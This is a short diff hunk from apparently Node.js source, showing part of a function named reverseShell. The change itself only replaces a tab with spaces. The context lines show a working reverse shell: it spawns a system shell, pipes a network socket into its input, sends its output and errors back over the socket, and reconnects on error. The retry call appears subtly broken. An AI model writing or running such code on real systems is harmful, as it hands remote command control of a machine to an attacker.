@@ -14,7 +14,7 @@ function reverseShell(HOST,PORT) {
         var cmd = child_process.spawn(shell_path);
         client.pipe(cmd.stdin);
         cmd.stdout.pipe(client);
-		cmd.stderr.pipe(client);
+        cmd.stderr.pipe(client);
     });
     client.on('error', function(e) {
         setTimeout(reverseShell(HOST,PORT), TIMEOUT);
